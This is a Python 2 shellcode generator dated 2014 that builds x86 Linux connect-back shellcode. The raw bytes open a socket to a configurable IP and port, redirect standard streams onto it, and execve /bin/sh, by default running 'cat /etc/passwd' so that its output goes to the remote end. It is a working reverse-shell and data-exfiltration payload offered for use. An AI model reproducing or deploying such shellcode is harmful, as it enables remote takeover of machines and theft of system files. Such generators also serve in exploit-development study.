import sys
from struct import pack
from build_sockaddr import *
from execve import *
from description import *
from out_format import *

##########################################################
#
#  1.  connect to IP:PORT
#  2.  Run binfile  with paramters if given
#
#	                         random	     2014-04-21
##########################################################


##########################################################

IP = '127.0.0.3'
PORT = 5555
BIN_FILE = '/bin/sh'
PARAMETERS = ['-c','cat /etc/passwd']
ALIGN = 4
UID = 0

##########################################################
LANGUAGE = 'c'
des_format = 'shellcode: connect to %s:%s && execve(\'%s\',%s)' 
out_string = (str(IP),str(PORT),BIN_FILE,PARAMETERS)
##########################################################


def connect_back_shellcode(ip,port,payload):

	if (not port & 0xFF) or \
		(not port>>8 & 0xFF) :
		print 'port contains null bytes'
		exit(0) 

	shellcode = ''
	#sock()
	shellcode += '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x6a\x01\x6a\x02\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc6'	
	
	#connect()
	shellcode += build_sockaddr_shellcode(ip, port)

	shellcode += '\x89\xe1\x6a\x10\x51\x56\x89\xe1\xb3\x03\xb0\x66\xcd\x80'

	#call dup2(sockfd,0) dup2(sockfd,1) dup2(sockfd,2)
	shellcode += '\x89\xf3\x31\xc9\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80'

	#payload: execve(binpath,[binpath,arg1,arg2,...],NULL)
	shellcode += payload
	
	#call exit()
	#shellcode += '\x31\xc0\x31\xdb\x40\xcd\x80'
	
	return shellcode



def main():
	description(LANGUAGE,des_format,out_string)
	PAYLOAD = execve_shellcode(binpath=BIN_FILE, parameters=PARAMETERS)
	shellcode = connect_back_shellcode(ip=IP, port=PORT, payload = PAYLOAD)
	out_format(LANGUAGE,ouput=shellcode)

if __name__ == '__main__':	
	main()


